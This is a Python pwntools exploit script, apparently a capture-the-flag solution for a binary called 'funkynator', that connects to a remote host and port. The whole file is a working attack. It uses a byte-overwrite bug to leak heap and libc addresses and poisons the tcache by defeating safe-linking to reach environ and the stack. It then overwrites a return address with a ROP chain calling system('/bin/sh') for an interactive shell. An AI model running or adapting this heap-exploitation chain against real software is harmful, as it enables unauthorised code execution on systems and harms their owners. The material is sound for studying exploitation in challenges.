#!/usr/bin/env python3

from pwn import *

exe = ELF("funkynator_patched")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("154.57.164.74", 31688)

    return r


def funkify_msg(length: int, msg: bytes, save: bool = True) -> int | None:
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"length of your message:", str(length).encode())
    r.sendlineafter(b"your message:", msg)
    r.sendlineafter(b"processing your text?", b"n")
    r.sendlineafter(b"save this message to memory?", b"y" if save else b"n")

    if save:        
        r.recvuntil(b"location ")
        return int(r.recvline().strip())
    else:
        return None


def view_memory(idx: int) -> bytes:
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"would like to view:\n", str(idx).encode())
    return r.recvline()


def delete_memory(idx: int):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"would like to delete:\n", str(idx).encode())


def process_memory(idx: int, actions: tuple[dict[str, int | bytes]]) -> bytes | None:
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b"would like to continue processing:\n", str(idx).encode())

    for action in actions:
        result = processing_menu(action["choice"], action["idx"], action["data"])

    return result


def processing_menu(choice: int, idx: int | None = None, data: bytes | None = None) -> bytes | None:
    r.sendlineafter(b"> ", str(choice).encode())

    if choice == 1:
        r.recvuntil(b"Your final message:\n")
        result = r.recvline()
        r.sendlineafter(b"save this message to memory?\n", b"y")
        return result

    if choice == 2:
        return r.recvline()
    
    if choice == 3:
        r.sendlineafter(b"offset of the byte:", str(idx).encode())
        r.sendlineafter(b"overwritten with?", data)
        return
    

def addr2list(addr: int) -> list[bytes]:
    b = addr.to_bytes(8, byteorder = 'little')
    return [bytes([byte]) for byte in b]


# NOTE: This function is only used for the final ROP chain, since once the function
#       returns it will trigger the chain and skip the remaining questions in the menu
#
def funkify_shell(length: int, msg: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"length of your message:", str(length).encode())
    r.sendlineafter(b"your message:", msg)


def main():
    r = conn()

    r.sendlineafter(b"your name?", b"A" * 0x20)

    A = funkify_msg(0x27, b"A" * 0x27)
    funkify_msg(0x27, b"B" * 0x27, False)   # When not saved, the chunk is freed afterwards

    leak = process_memory(A, ({"choice": 3, "idx": 0x27, "data": b"A"},
                              {"choice": 3, "idx": 0x28, "data": b"A"},
                              {"choice": 3, "idx": 0x29, "data": b"A"},
                              {"choice": 3, "idx": 0x2a, "data": b"A"},
                              {"choice": 3, "idx": 0x2b, "data": b"A"},
                              {"choice": 3, "idx": 0x2c, "data": b"A"},
                              {"choice": 3, "idx": 0x2d, "data": b"A"},
                              {"choice": 3, "idx": 0x2e, "data": b"A"},
                              {"choice": 3, "idx": 0x2f, "data": b"A"},
                              {"choice": 1, "idx": None, "data": None}
                            ))

    heap = u64(leak[0x30:].strip(b"\n").ljust(8, b"\x00")) << 12
    log.info(f"heap: 0x{heap:x}")

    # Fix chunk to avoid crash when allocating a new chunk
    process_memory(A, ({"choice": 3, "idx": 0x27, "data": b"\x00"},
                       {"choice": 3, "idx": 0x28, "data": b"\x31"},
                       {"choice": 3, "idx": 0x29, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2a, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2b, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2c, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2d, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2e, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2f, "data": b"\x00"},
                       {"choice": 1, "idx": None, "data": None}
                    ))

    B = funkify_msg(0x27, b"B" * 0x27)
    C = funkify_msg(0x417, b"C" * 0x417)
    funkify_msg(0x27, b"D" * 0x27, False)   # Avoid consolidation with the top chunk when freeing B
    delete_memory(C)

    leak = process_memory(B, ({"choice": 3, "idx": 0x27, "data": b"B"},
                              {"choice": 3, "idx": 0x28, "data": b"B"},
                              {"choice": 3, "idx": 0x29, "data": b"B"},
                              {"choice": 3, "idx": 0x2a, "data": b"B"},
                              {"choice": 3, "idx": 0x2b, "data": b"B"},
                              {"choice": 3, "idx": 0x2c, "data": b"B"},
                              {"choice": 3, "idx": 0x2d, "data": b"B"},
                              {"choice": 3, "idx": 0x2e, "data": b"B"},
                              {"choice": 3, "idx": 0x2f, "data": b"B"},
                              {"choice": 1, "idx": None, "data": None}
                            ))
    
    libc.address = u64(leak[0x30:].strip(b"\n").ljust(8, b"\x00")) - 0x1e7b20
    log.info(f"libc: 0x{libc.address:x}")

    process_memory(B, ({"choice": 3, "idx": 0x27, "data": b"\x00"},
                       {"choice": 3, "idx": 0x28, "data": b"\x20"},
                       {"choice": 3, "idx": 0x29, "data": b"\x04"},
                       {"choice": 3, "idx": 0x2a, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2b, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2c, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2d, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2e, "data": b"\x00"},
                       {"choice": 3, "idx": 0x2f, "data": b"\x00"},
                       {"choice": 1, "idx": None, "data": None}
                    ))

    D = funkify_msg(0x27, b"D" * 0x27)
    E = funkify_msg(0x27, b"E" * 0x27)  # This is right after the B chunk
    F = funkify_msg(0x27, b"F" * 0x27)  # This gives us a count of 2 for the tcache of size 0x30
    delete_memory(F)
    delete_memory(E)

    # NOTE: `fgets()` wipes out all the data so the chunk must be out of the environ value
    obfuscate = lambda addr, base: addr ^ (base >> 12)
    target = addr2list(obfuscate(libc.sym.environ - 0x28, heap))

    leak = process_memory(B, ({"choice": 3, "idx": 0x30, "data": target[0]},
                              {"choice": 3, "idx": 0x31, "data": target[1]},
                              {"choice": 3, "idx": 0x32, "data": target[2]},
                              {"choice": 3, "idx": 0x33, "data": target[3]},
                              {"choice": 3, "idx": 0x34, "data": target[4]},
                              {"choice": 3, "idx": 0x35, "data": target[5]},
                              {"choice": 3, "idx": 0x36, "data": target[6]},
                              {"choice": 3, "idx": 0x37, "data": target[7]},
                              {"choice": 1, "idx": None, "data": None}
                            ))
    
    E = funkify_msg(0x27, b"E" * 0x27)
    F = funkify_msg(0x27, b"F" * 0x27)

    leak = process_memory(F, ({"choice": 3, "idx": 0x27, "data": b"F"},
                              {"choice": 1, "idx": None, "data": None}
                            ))
    
    # Since main does not return, we can overwrite the return address of `funkify_msg()`
    funkify_ret = u64(leak[0x28:].strip(b"\n").ljust(8, b"\x00")) - 0x1b0
    log.info(f"funkify return address: 0x{funkify_ret:x}")

    # We'll use the same technique but with bigger chunks to make the payload fit
    G = funkify_msg(0x37, b"G" * 0x37)
    H = funkify_msg(0x37, b"H" * 0x37)
    I = funkify_msg(0x37, b"I" * 0x37)

    delete_memory(I)    # This gives us a count of 2 for the tcache of size 0x30
    delete_memory(H)

    target = addr2list(obfuscate(funkify_ret - 0x8, heap))
    leak = process_memory(G, ({"choice": 3, "idx": 0x40, "data": target[0]},
                              {"choice": 3, "idx": 0x41, "data": target[1]},
                              {"choice": 3, "idx": 0x42, "data": target[2]},
                              {"choice": 3, "idx": 0x43, "data": target[3]},
                              {"choice": 3, "idx": 0x44, "data": target[4]},
                              {"choice": 3, "idx": 0x45, "data": target[5]},
                              {"choice": 3, "idx": 0x46, "data": target[6]},
                              {"choice": 3, "idx": 0x47, "data": target[7]},
                              {"choice": 1, "idx": None, "data": None}
                            ))
    
    payload = flat(
        b"A" * 0x8,
        libc.address + 0x2a145,     # pop rdi; ret;
        libc.search(b"/bin/sh").__next__(),
        libc.address + 0x2a146,     # dummy return to align the stack
        libc.sym.system
    )

    H = funkify_msg(0x37, b"H" * 0x37)

    # Since we are overwriting the length variable as well (with the last newline),
    # we can add another byte before the newline to make sure the function doesn't
    # null-terminate the payload
    funkify_shell(0x37, payload + b"\xFF" + b"\n")
    r.interactive("$ ")


if __name__ == "__main__":
    main()
